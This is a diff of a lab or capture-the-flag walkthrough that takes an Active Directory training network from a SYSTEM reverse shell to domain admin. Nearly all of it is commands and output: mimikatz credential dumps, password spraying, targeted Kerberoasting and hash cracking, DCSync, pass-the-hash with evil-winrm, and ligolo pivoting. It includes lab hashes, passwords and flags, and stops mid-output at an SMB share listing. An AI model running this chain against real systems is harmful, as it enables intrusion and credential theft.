+Dropping a new file into the monitored folder fires the task, and the netcat listener catches a SYSTEM shell:
+
+./ms01/9.png
+
 ```
 C:\Users\ilfserveradm\Desktop>nc64.exe -lvnp 1337
 listening on [any] 1337 ...
@@ -2360,301 +1671,165 @@ whoami
 nt authority\system
 ```
 
+---
+
+## Flag (MS01)
+
 ```
+C:\Windows\system32>cd c:\users\ilfserveradm\desktop
+C:\Windows\system32>type flag.txt
 type flag.txt
 33a9d46de4015e7b3b0ad592a9394720
 ```
 
-## Credentials harvesting
-
-running mimikatz since now i am a local admin:
+**Flag:**
 
 ```
+33a9d46de4015e7b3b0ad592a9394720
+```
+
+---
+
+## Credential Harvesting on MS01 (Local Admin)
+
+With local admin access, `mimikatz` is run again:
+
+bash
+
+```bash
 c:\Users\ilfserveradm\Desktop>.\mimikatz
-.\mimikatz
+```
 
-  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
- .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
- ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
- ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
- '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
-  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
-
+```
 mimikatz # privilege::debug
 Privilege '20' OK
 
 mimikatz # lsadump::sam
+```
+
+```
 Domain : ACADEMY-AEN-MS0
 SysKey : 61b3d49a6205a1dedb14591c22d36afc
 Local SID : S-1-5-21-1020326033-369054202-3290056218
-
-SAMKey : 93454d09b81d64dc5dc4710d08562175
 
 RID  : 000001f4 (500)
 User : Administrator
   Hash NTLM: 0850f84bbd902729bb3af737405cc788
 
-Supplemental Credentials:
-* Primary:NTLM-Strong-NTOWF *
-    Random Value : f14b84784180c57a571f0447e229f9c6
-
-* Primary:Kerberos-Newer-Keys *
-    Default Salt : ACADEMY-AEN-MS01.INLANEFREIGHT.LOCALAdministrator
-    Default Iterations : 4096
-    Credentials
-      aes256_hmac       (4096) : 1484bb4178abdc367dd900f53920cdd8d4fce261027627ad6b490b8a26bedb9a
-      aes128_hmac       (4096) : 1d645f67cbebf1111e9d4cd1624e632e
-      des_cbc_md5       (4096) : 236767e601c2ab57
-    OldCredentials
-      aes256_hmac       (4096) : a7be6e113dde09c7c8ab20ab33d0110351a06aca7770adc2ab7adc5a3476c31d
-      aes128_hmac       (4096) : 66150075fbb3b2b6197fed9538538c36
-      des_cbc_md5       (4096) : d51cdf6438e91f7a
-    OlderCredentials
-      aes256_hmac       (4096) : a394ab9b7c712a9e0f3edb58404f9cf086132d29ab5b796d937b197862331b07
-      aes128_hmac       (4096) : 7630dab9bdaeebf9b4aa6c595347a0cc
-      des_cbc_md5       (4096) : 9876615285c2766e
-
-* Packages *
-    NTLM-Strong-NTOWF
-
-* Primary:Kerberos *
-    Default Salt : ACADEMY-AEN-MS01.INLANEFREIGHT.LOCALAdministrator
-    Credentials
-      des_cbc_md5       : 236767e601c2ab57
-    OldCredentials
-      des_cbc_md5       : d51cdf6438e91f7a
-
-
-RID  : 000001f5 (501)
-User : Guest
-
-RID  : 000001f7 (503)
-User : DefaultAccount
-
-RID  : 000001f8 (504)
-User : WDAGUtilityAccount
-  Hash NTLM: 4b4ba140ac0767077aee1958e7f78070
-
-Supplemental Credentials:
-* Primary:NTLM-Strong-NTOWF *
-    Random Value : 92793b2cbb0532b4fbea6c62ee1c72c8
-
-* Primary:Kerberos-Newer-Keys *
-    Default Salt : WDAGUtilityAccount
-    Default Iterations : 4096
-    Credentials
-      aes256_hmac       (4096) : c34300ce936f766e6b0aca4191b93dfb576bbe9efa2d2888b3f275c74d7d9c55
-      aes128_hmac       (4096) : 6b6a769c33971f0da23314d5cef8413e
-      des_cbc_md5       (4096) : 61299e7a768fa2d5
-
-* Packages *
-    NTLM-Strong-NTOWF
-
-* Primary:Kerberos *
-    Default Salt : WDAGUtilityAccount
-    Credentials
-      des_cbc_md5       : 61299e7a768fa2d5
-
-
 RID  : 000003ea (1002)
 User : ilfserveradm
   Hash NTLM: 22712976f35dc45157952a07c7ffc774
-
-Supplemental Credentials:
-* Primary:NTLM-Strong-NTOWF *
-    Random Value : 097a1ff766ac53e31d7112b23b4b1843
-
-* Primary:Kerberos-Newer-Keys *
-    Default Salt : ACADEMY-AEN-MS01.INLANEFREIGHT.LOCALilfserveradm
-    Default Iterations : 4096
-    Credentials
-      aes256_hmac       (4096) : 6b23b9ccd917d962bd42fc4168f7e037b67863ea4477bf8cd107b57817a4de29
-      aes128_hmac       (4096) : 30e80864c09d79f23afae50b8d00bb54
-      des_cbc_md5       (4096) : e091a1c80b574c15
-
-* Packages *
-    NTLM-Strong-NTOWF
-
-* Primary:Kerberos *
-    Default Salt : ACADEMY-AEN-MS01.INLANEFREIGHT.LOCALilfserveradm
-    Credentials
-      des_cbc_md5       : e091a1c80b574c15
-
 ```
 
-```
+bash
+
+```bash
 mimikatz # lsadump::secrets
+```
+
+```
 Domain : ACADEMY-AEN-MS0
-SysKey : 61b3d49a6205a1dedb14591c22d36afc
-
-Local name : ACADEMY-AEN-MS0 ( S-1-5-21-1020326033-369054202-3290056218 )
-Domain name : INLANEFREIGHT ( S-1-5-21-2814148634-3729814499-1637837074 )
 Domain FQDN : INLANEFREIGHT.LOCAL
-
-Policy subsystem is : 1.18
-LSA Key(s) : 1, default {13764b01-b89c-8adf-69ec-8937ee43821e}
-  [00] {13764b01-b89c-8adf-69ec-8937ee43821e} 587be7dcfb75bb9ebb0c5c75cf4afb4488e602f9926f3404a09ecf8ba20b04e7
-
-Secret  : $MACHINE.ACC
-cur/hex : 08 55 36 e3 96 4a f6 dc a5 bf dd 21 24 27 14 e1 d5 eb 65 18 c0 11 10 27 83 9d 0b bb 93 b1 67 af da 26 8f 54 c9 8d cd 4b 3f d4 b5 d9 9e 8d 73 f5 a1 d0 b2 3f b0 29 ff 29 b8 96 4d 93 e4 0c cd 0a 6a 54 64 a2 f9 86 66 44 86 55 69 1b 03 92 31 48 cc 38 cc 5f e9 e9 2c b3 9b fb 92 fb 9d b6 a2 4a 42 78 22 f1 2b 10 52 6b 58 b1 67 b7 22 38 5e ef e7 b6 11 21 82 d7 b8 7c dd e0 30 2a a4 1b 7e a0 4f e7 52 e1 66 4c f4 ed da e9 2b 09 6a 88 07 08 57 73 2b 7a d6 06 4a 96 9c 3a 41 1d 66 36 11 37 d4 a2 e5 6b b3 21 49 ed 5f 8d 2b db ec 16 66 5e f0 94 a7 e4 12 4a 58 c5 63 28 2b 85 d0 a0 37 5e 24 60 e0 09 9a aa 2e de 31 a0 93 24 31 30 5f ec 7f 0e ef 35 3b 51 9a 9b c0 9c 72 2e 2b f7 58 be 80 0a cb 19 27 11 43 1c f7 aa bb 70 2e 16 56 f8
-    NTLM:8300acf19dd9ac58b6ddc2a6956f4ebe
-    SHA1:c137a0874ca4dbcc7621b64e1f872c675fb1bdf8
-old/text: -2d"GC)[+6,[+mC+UC5KXVoH>j`S8CAlq1nQCP6:[*-Zv@_NAs`Pm$9xv7ohquyAKz1:rX[E40v)=p8-5@%eK3(<7tZW"I\7`,Bu#]N$'%A`$Z?E@9V2zdh=
-    NTLM:ced50a6f3cb256110200dcb022b32c12
-    SHA1:0b5cb5af0f13110312456892b7ebede53db440e8
 
 Secret  : DefaultPassword
 cur/text: DBAilfreight1!
-
-Secret  : DPAPI_SYSTEM
-cur/hex : 01 00 00 00 37 62 35 26 80 4c 6b 2f 11 ca 06 25 ab 97 21 3f 84 f8 74 fa bc 69 a1 c4 37 2b df f8 cd 6c 8f 0a 8a d9 67 e9 42 cf 4f 96
-    full: 37623526804c6b2f11ca0625ab97213f84f874fabc69a1c4372bdff8cd6c8f0a8ad967e942cf4f96
-    m/u : 37623526804c6b2f11ca0625ab97213f84f874fa / bc69a1c4372bdff8cd6c8f0a8ad967e942cf4f96
-old/hex : 01 00 00 00 51 9c 86 b4 cb dc 97 8b 35 9b c0 39 17 34 16 62 31 98 c1 07 ce 7d 9f 94 fc e7 2c d9 59 8a c6 07 10 78 7c 0d 9a 56 ce 0b
-    full: 519c86b4cbdc978b359bc039173416623198c107ce7d9f94fce72cd9598ac60710787c0d9a56ce0b
-    m/u : 519c86b4cbdc978b359bc039173416623198c107 / ce7d9f94fce72cd9598ac60710787c0d9a56ce0b
-
-Secret  : NL$KM
-cur/hex : a2 52 9d 31 0b b7 1c 75 45 d6 4b 76 41 2d d3 21 c6 5c dd 04 24 d3 07 ff ca 5c f4 e5 a0 38 94 14 91 64 fa c7 91 d2 0e 02 7a d6 52 53 b4 f4 a9 6f 58 ca 76 00 dd 39 01 7d c5 f7 8f 4b ab 1e dc 63
-old/hex : a2 52 9d 31 0b b7 1c 75 45 d6 4b 76 41 2d d3 21 c6 5c dd 04 24 d3 07 ff ca 5c f4 e5 a0 38 94 14 91 64 fa c7 91 d2 0e 02 7a d6 52 53 b4 f4 a9 6f 58 ca 76 00 dd 39 01 7d c5 f7 8f 4b ab 1e dc 63
 ```
 
-Searching for local users:
-```
+Local users on the host:
+
+bash
+
+```bash
 c:\Users>dir
-dir
- Volume in drive C has no label.
- Volume Serial Number is B8B3-0D72
+```
 
+```
  Directory of c:\Users
-
-11/14/2026  11:54 AM    <DIR>          .
-11/14/2026  11:54 AM    <DIR>          ..
 06/01/2022  02:52 PM    <DIR>          Administrator
 11/14/2026  11:54 AM    <DIR>          backupadm
 11/14/2026  12:49 PM    <DIR>          ilfserveradm
 10/06/2021  11:31 AM    <DIR>          lab_adm
 06/01/2022  01:52 PM    <DIR>          mssqladm
-10/06/2021  02:46 PM    <DIR>          Public
-               0 File(s)              0 bytes
-               8 Dir(s)  17,653,334,016 bytes free
-
-c:\Users>
 ```
 
-Password works:
+The `DefaultPassword` secret works domain-wide for `mssqladm`:
+
+bash
+
+```bash
+nxc smb 172.16.8.0/24 -u mssqladm -p 'DBAilfreight1!'
+```
 
 ```
- nxc smb 172.16.8.0/24 -u mssqladm -p 'DBAilfreight1!'
 SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ACADEMY-AEN-DEV) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:None)
 SMB         172.16.8.50     445    ACADEMY-AEN-MS0  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ACADEMY-AEN-MS0) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:None)
 SMB         172.16.8.3      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [+] INLANEFREIGHT.LOCAL\mssqladm:DBAilfreight1! 
-SMB         172.16.8.50     445    ACADEMY-AEN-MS0  [+] INLANEFREIGHT.LOCAL\mssqladm:DBAilfreight1! 
-SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\mssqladm:DBAilfreight1! 
-Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
-
+SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [+] INLANEFREIGHT.LOCAL\mssqladm:DBAilfreight1!
+SMB         172.16.8.50     445    ACADEMY-AEN-MS0  [+] INLANEFREIGHT.LOCAL\mssqladm:DBAilfreight1!
+SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\mssqladm:DBAilfreight1!
 ```
 
-Enumerating mssqladm acl:
+---
 
-![](./bh/2.png)
+## ACL Abuse Chain to Domain Admin
 
-![](./bh/3.png)
+BloodHound shows `mssqladm` has `GenericWrite` over `ttimmons`, who in turn has `GenericAll` over the **Server Admins** group:
 
-By following this acl chain, a domain compromise will be possible since server admins can perform a dcsync.
+./bh/2.png
 
-Performing a targetedKerberoast against ttimmons, leveraging GenericWrite
+**Server Admins** holds `GetChangesInFilteredSet` over the domain object, which is sufficient to perform a DCSync:
 
-```
+./bh/3.png
+
+### Targeted Kerberoasting — ttimmons
+
+The `GenericWrite` right over `ttimmons` is abused to add a temporary SPN and request a ticket for it:
+
+bash
+
+```bash
 python3 targetedKerberoast.py -v -d 'INLANEFREIGHT.LOCAL' -u 'mssqladm' -p 'DBAilfreight1!' --dc-ip 172.16.8.3 --request-user ttimmons
+```
+
+```
 [*] Starting kerberoast attacks
 [*] Attacking user (ttimmons)
 [VERBOSE] SPN added successfully for (ttimmons)
 [+] Printing hash for (ttimmons)
-$krb5tgs$23$*ttimmons$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/ttimmons*$e237055db7f0263163588236a6b70956$0d33f0c0be27aa2a1dc34b0560e91448a719ae203e31fec3f8cf183589ceb2b283c807d6d274ff70cd229bea5d022170281b5ad0cc9e573d61ddfc370cbc1d29798f82381d75b220c582128314af65c37b465d636c3dcbf551287e0f5634007b30c80e32a36a35299fcf8ff71c8cc8bbb450e07bf91c58ac15803681b167c0926d3f2f6d812a18b0703e7c7162ef9ea8a513c521098ce31179f0b78bf922467e263bd749e59e8c2140f8bc094a0b35427805444c0aee92bd49c6adfb686413dd98ece7b5477aa731228adc3092c9cc2b29deeeaea707060772a18ecf6a0a43b154e8eb6de8797031ac10935867b63fdf7423e4ab8dad6dd0eaf3b85602d6074ee2b54c5a9c736149950f41c3ba4c2e492726e347560ebceed61199dd9f38d91f1c4afcfc40a3085d74a826f6f9e742eeecd6d4a76d033eb5eda4c17abb738fb807d67ee56351fa843495ba28bdea9dc97ab295a4d2bf317ff888f86851958619594db523c3b0cad280c3165543484cbde6692e36643c81ede8a3db58c463c2c108f8dcbc65d01a592a6efc0700f8282729376bccec0823ebce023d01225c88d26d1ad9fd42faf5b1df224cf62d6be961c5655e10cdbe17b7203b5f0d0c43593ccf12e4e1ec038e3b2d99e9c986e0290a5994588b177d1835b44f357a95efa6bf7bd12e6e3863dcdf2d785b2cf383e9b73a8ee93ef8f5c2497808dd9b3557d2d1c08fdc048bbb76747e710ef7c8d0e9c19e8c720c8c21a0a314f13e3c35ccf69d6b495c39dcaf764219be8f7f3d56b855e875843c3e447e100b4d3f8da6568d572ef53c9a787061eb84a98101951014cc0082f3fb8f39d96dc8ef7623485025b2471d50f943783879e6a4ad721abebcb0a9cf1a31bd6b23d52709e173351ad66165cf4f57b44abdefff59f9c269665c4653c64a4b215f08ef1913f2dad3f88de5c96909e48f09082b20279c6add4064cf53b54e46d75bac1ae0cc3dac4e9d23d16ed849f5c33260e949c6614851f7e0825d3d1661ee045f32f7959fd0223ff124c28256bf279297a7afd800ec8ade41991085711568441e5175649f00cb0830d756c97ab7bfc92ee891435ff57f1bacab1288490e321a0f578496849b582a60b2754b1464fffeb62c16947e74bd1d67faedc81c1734c82aaf7a8a0774c604bd2648a5be0b096fe2233c879da5116fb916d5e700b6740d90a9d5f16ae85687c28489fa00fdf4c0c28bdad17c1e87a71173061f7f409921b3d2713b1d7aa566641928b209dc7497b8795f6c1c89142e5cda7205c38e032106169073fd833205e649ba5ee9b9690494adaca182ece00b9389ca9afdc7f3791e9d9d4ccc370c562f3b5cfca7a6
+$krb5tgs$23$*ttimmons$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/ttimmons*$...
 [VERBOSE] SPN removed successfully for (ttimmons)
-
 ```
 
-```
+bash
+
+```bash
 hashcat -m 13100 ttimmons.hash /usr/share/wordlists/rockyou.txt
-hashcat (v7.1.2) starting
-
-OpenCL API (OpenCL 3.0 PoCL 7.1+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 21.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
-====================================================================================================================================================
-* Device #01: cpu-sandybridge-AMD Ryzen 7 5700G with Radeon Graphics, 1468/2937 MB (1468 MB allocatable), 4MCU
-
-Minimum password length supported by kernel: 0
-Maximum password length supported by kernel: 256
-Minimum salt length supported by kernel: 0
-Maximum salt length supported by kernel: 256
-
-Hashes: 1 digests; 1 unique digests, 1 unique salts
-Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
-Rules: 1
-
-Optimizers applied:
-* Zero-Byte
-* Not-Iterated
-* Single-Hash
-* Single-Salt
-
-ATTENTION! Pure (unoptimized) backend kernels selected.
-Pure kernels can crack longer passwords, but drastically reduce performance.
-If you want to switch to optimized kernels, append -O to your commandline.
-See the above message to find out about the exact limits.
-
-Watchdog: Temperature abort trigger set to 90c
-
-Host memory allocated for this attack: 513 MB (787 MB free)
-
-Dictionary cache hit:
-* Filename..: /usr/share/wordlists/rockyou.txt
-* Passwords.: 14344385
-* Bytes.....: 139921507
-* Keyspace..: 14344385
-
-$krb5tgs$23$*ttimmons$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/ttimmons*$e237055db7f0263163588236a6b70956$0d33f0c0be27aa2a1dc34b0560e91448a719ae203e31fec3f8cf183589ceb2b283c807d6d274ff70cd229bea5d022170281b5ad0cc9e573d61ddfc370cbc1d29798f82381d75b220c582128314af65c37b465d636c3dcbf551287e0f5634007b30c80e32a36a35299fcf8ff71c8cc8bbb450e07bf91c58ac15803681b167c0926d3f2f6d812a18b0703e7c7162ef9ea8a513c521098ce31179f0b78bf922467e263bd749e59e8c2140f8bc094a0b35427805444c0aee92bd49c6adfb686413dd98ece7b5477aa731228adc3092c9cc2b29deeeaea707060772a18ecf6a0a43b154e8eb6de8797031ac10935867b63fdf7423e4ab8dad6dd0eaf3b85602d6074ee2b54c5a9c736149950f41c3ba4c2e492726e347560ebceed61199dd9f38d91f1c4afcfc40a3085d74a826f6f9e742eeecd6d4a76d033eb5eda4c17abb738fb807d67ee56351fa843495ba28bdea9dc97ab295a4d2bf317ff888f86851958619594db523c3b0cad280c3165543484cbde6692e36643c81ede8a3db58c463c2c108f8dcbc65d01a592a6efc0700f8282729376bccec0823ebce023d01225c88d26d1ad9fd42faf5b1df224cf62d6be961c5655e10cdbe17b7203b5f0d0c43593ccf12e4e1ec038e3b2d99e9c986e0290a5994588b177d1835b44f357a95efa6bf7bd12e6e3863dcdf2d785b2cf383e9b73a8ee93ef8f5c2497808dd9b3557d2d1c08fdc048bbb76747e710ef7c8d0e9c19e8c720c8c21a0a314f13e3c35ccf69d6b495c39dcaf764219be8f7f3d56b855e875843c3e447e100b4d3f8da6568d572ef53c9a787061eb84a98101951014cc0082f3fb8f39d96dc8ef7623485025b2471d50f943783879e6a4ad721abebcb0a9cf1a31bd6b23d52709e173351ad66165cf4f57b44abdefff59f9c269665c4653c64a4b215f08ef1913f2dad3f88de5c96909e48f09082b20279c6add4064cf53b54e46d75bac1ae0cc3dac4e9d23d16ed849f5c33260e949c6614851f7e0825d3d1661ee045f32f7959fd0223ff124c28256bf279297a7afd800ec8ade41991085711568441e5175649f00cb0830d756c97ab7bfc92ee891435ff57f1bacab1288490e321a0f578496849b582a60b2754b1464fffeb62c16947e74bd1d67faedc81c1734c82aaf7a8a0774c604bd2648a5be0b096fe2233c879da5116fb916d5e700b6740d90a9d5f16ae85687c28489fa00fdf4c0c28bdad17c1e87a71173061f7f409921b3d2713b1d7aa566641928b209dc7497b8795f6c1c89142e5cda7205c38e032106169073fd833205e649ba5ee9b9690494adaca182ece00b9389ca9afdc7f3791e9d9d4ccc370c562f3b5cfca7a6:Repeat09
-                                                          
-Session..........: hashcat
-Status...........: Cracked
-Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
-Hash.Target......: $krb5tgs$23$*ttimmons$INLANEFREIGHT.LOCAL$INLANEFRE...fca7a6
-Time.Started.....: Sat Nov 14 16:07:33 2026 (6 secs)
-Time.Estimated...: Sat Nov 14 16:07:39 2026 (0 secs)
-Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
-Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
-Guess.Queue......: 1/1 (100.00%)
-Speed.#01........:  1855.1 kH/s (1.85ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
-Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
-Progress.........: 10678272/14344385 (74.44%)
-Rejected.........: 0/10678272 (0.00%)
-Restore.Point....: 10674176/14344385 (74.41%)
-Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
-Candidate.Engine.: Device Generator
-Candidates.#01...: RipBMB420 -> Redeye2
-Hardware.Mon.#01.: Util: 78%
-
-Started: Sat Nov 14 16:07:31 2026
-Stopped: Sat Nov 14 16:07:39 2026
-
 ```
 
-ttimmons:Repeat09
+```
+Status...........: Cracked
+Hash.Target......: $krb5tgs$23$*ttimmons$INLANEFREIGHT.LOCAL...
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+...:Repeat09
+```
 
-ttimmons can add itself to the Server Admins group:
+`ttimmons` then adds itself to **Server Admins** using its `GenericAll` right:
+
+bash
 
 ```bash
 net rpc group addmem "Server Admins" "ttimmons" -U "INLANEFREIGHT.LOCAL"/"ttimmons"%"Repeat09" -S DC01
 ```
 
-dcsyinc:
+### DCSync
+
+bash
 
 ```bash
-impacket-secretsdump 'INLANEFREIGHT.LOCAL'/'ttimmons':'Repeat09'@'DC01' -just-dc-user Administrator   
-Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+impacket-secretsdump 'INLANEFREIGHT.LOCAL'/'ttimmons':'Repeat09'@'DC01' -just-dc-user Administrator
+```
 
+```
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea787ddbb6e6afa2:::
@@ -2662,109 +1837,85 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea787ddbb6e6a
 Administrator:aes256-cts-hmac-sha1-96:547ff3f4cc75b6dbfe7fee1f7e3f966d0bc6e689858dc25250c8f9a4191b8b91
 Administrator:aes128-cts-hmac-sha1-96:0477b3d27dd7e44398b27b3d69a9fb43
 Administrator:des-cbc-md5:61e31c8c2c0bd9cd
-[*] Cleaning up... 
-
 ```
 
-Domain Admin:
+---
+
+## Domain Admin Access
+
+The dumped NTLM hash authenticates directly to the domain controller via pass-the-hash:
+
+bash
+
+```bash
+evil-winrm -i 172.16.8.3 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2
+```
 
 ```
-evil-winrm -i 172.16.8.3 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2  
-                                        
-Evil-WinRM shell v4.1
-                                        
-Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                
-                                        
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                           
-                                        
-Info: Establishing connection to remote endpoint
-                                        
-Info: Connection successful
-*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
-*Evil-WinRM* PS C:\Users\Administrator> ls
-
-
-    Directory: C:\Users\Administrator
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
-d-r---         6/2/2022  12:11 AM                3D Objects
-d-r---         6/2/2022  12:11 AM                Contacts
-d-r---         6/2/2022  12:11 AM                Desktop
-d-r---         6/2/2022  12:11 AM                Documents
-d-r---         6/2/2022  12:11 AM                Downloads
-d-r---         6/2/2022  12:11 AM                Favorites
-d-r---         6/2/2022  12:11 AM                Links
-d-r---         6/2/2022  12:11 AM                Music
-d-r---         6/2/2022  12:11 AM                Pictures
-d-r---         6/2/2022  12:11 AM                Saved Games
-d-r---         6/2/2022  12:11 AM                Searches
-d-r---         6/2/2022  12:11 AM                Videos
-
-
 *Evil-WinRM* PS C:\Users\Administrator> cd Desktop
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
 
-
     Directory: C:\Users\Administrator\Desktop
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
 -a----         6/1/2022  11:34 AM             32 flag.txt
-
 
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> type flag.txt
 7c09eb1fff981654a3bb3b4a4e0d176a
-*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
-
 ```
 
-## post exploitation enumeration:
+---
+
+## Flag (Domain Admin)
+
+**Flag:**
 
 ```
+7c09eb1fff981654a3bb3b4a4e0d176a
+```
+
+---
+
+## Post-Exploitation — Pivoting to 172.16.9.0/23
+
+`DC01` has a second network interface on an unexplored range:
+
+bash
+
+```bash
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> ipconfig
+```
 
-Windows IP Configuration
-
-
+```
 Ethernet adapter Ethernet0:
-
-   Connection-specific DNS Suffix  . :
-   Link-local IPv6 Address . . . . . : fe80::cdfb:a651:6fc3:b81f%4
    IPv4 Address. . . . . . . . . . . : 172.16.8.3
-   Subnet Mask . . . . . . . . . . . : 255.255.254.0
    Default Gateway . . . . . . . . . : 172.16.8.1
 
 Ethernet adapter Ethernet1:
-
-   Connection-specific DNS Suffix  . :
-   Link-local IPv6 Address . . . . . : fe80::d4f4:3de1:ad36:5fdf%7
    IPv4 Address. . . . . . . . . . . : 172.16.9.3
-   Subnet Mask . . . . . . . . . . . : 255.255.254.0
    Default Gateway . . . . . . . . . : 172.16.9.1
-
 ```
 
-on kali a new listener is added on ligolo:
+A second ligolo listener is chained through the existing `dmz01` session:
 
-```
+bash
+
+```bash
 [Agent : srvadm@dmz01] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
 ```
 
-on dc:
+The agent binary is uploaded to `DC01` via `evil-winrm` and run, connecting back through the chained listener:
 
-```
+powershell
+
+```powershell
 *Evil-WinRM* PS C:\Users\Administrator\Documents> .\agent.exe -connect 172.16.8.120:11601 -ignore-cert
-agent.exe : time="2026-11-15T08:34:22-08:00" level=warning msg="warning, certificate validation disabled"
-    + CategoryInfo          : NotSpecified: (time="2026-11-1...ation disabled":String) [], RemoteException
-    + FullyQualifiedErrorId : NativeCommandError
-time="2026-11-15T08:34:22-08:00" level=info msg="Connection established" addr="172.16.8.120:11601"
-
 ```
 
-setting up the second tunnel:
+```
+time="2026-11-15T08:34:22-08:00" level=warning msg="warning, certificate validation disabled"
+time="2026-11-15T08:34:22-08:00" level=info msg="Connection established" addr="172.16.8.120:11601"
+```
+
+Once the new agent joins, a route to `172.16.9.0/23` is added:
 
 ```
 [Agent : srvadm@dmz01] » INFO[0657] Agent joined.                                 id=0050568a9bb0 name="INLANEFREIGHT\\Administrator@DC01" remote="127.0.0.1:45122"
@@ -2773,339 +1924,194 @@ setting up the second tunnel:
 [Agent : INLANEFREIGHT\Administrator@DC01] » autoroute
 ? Select routes to add: 172.16.9.3/23
 ? Create a new interface or use an existing one? Create a new interface
-? Enter interface name (leave empty for random name): 
-INFO[0707] Generating a random interface name...        
-INFO[0707] Using interface name gameleatherhead         
-INFO[0707] Interface gameleatherhead configured (will be created on tunnel start) 
-INFO[0707] Creating routes for gameleatherhead...       
+? Enter interface name (leave empty for random name):
+INFO[0707] Generating a random interface name...
+INFO[0707] Using interface name gameleatherhead
 ? Start the tunnel? Yes
-INFO[0711] Starting tunnel to INLANEFREIGHT\Administrator@DC01 (0050568a9bb0) 
-
+INFO[0711] Starting tunnel to INLANEFREIGHT\Administrator@DC01 (0050568a9bb0)
 ```
 
-Enumerating the hosts in the newly disclosed subnet reveals another host, aside from the DC.
+A sweep finds one additional live host:
+
+bash
+
+```bash
+fping -asgq 172.16.9.0/24
+```
 
 ```
- fping -asgq 172.16.9.0/24
 172.16.9.3
 172.16.9.25
-
      254 targets
        2 alive
      252 unreachable
-       0 unknown addresses
-
-    1008 timeouts (waiting for response)
-    1010 ICMP Echos sent
-       2 ICMP Echo Replies received
-       0 other ICMP received
-
- 48.9 ms (min round trip time)
- 59.4 ms (avg round trip time)
- 69.9 ms (max round trip time)
-       10.494 sec (elapsed real time)
-
 ```
 
-Only ssh is available:
+bash
+
+```bash
+nmap -sC -sV 172.16.9.25
+```
 
 ```
- nmap -sC -sV 172.16.9.25 
-Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-15 12:55 -0500
 Nmap scan report for 172.16.9.25
 Host is up (0.011s latency).
-Not shown: 999 filtered tcp ports (no-response)
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
 |   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
 |_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 15.66 seconds
-                                                                       
 ```
 
-I dumped ntds.dit but it did not revealed to be very useful in this case.
+Only SSH is reachable on `172.16.9.25`. A DCSync-based NTDS.dit dump was also attempted from `DC01` but did not yield anything useful for further access.
 
-SMB again
+---
+
+## SMB Share Enumeration — RSA Private Keys
+
+With Domain Admin access, the Department Shares are browsed once more:
+
+bash
 
 ```bash
 smbmap -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea787ddbb6e6afa2' -H 172.16.8.3 -r "Department Shares" --depth 5
 ```
 
-Discloses rsa private keys for the users:
-
 ```
-[+] IP: 172.16.8.3:445  Name: DC01.INLANEFREIGHT.LOCAL  Status: ADMIN!!!   
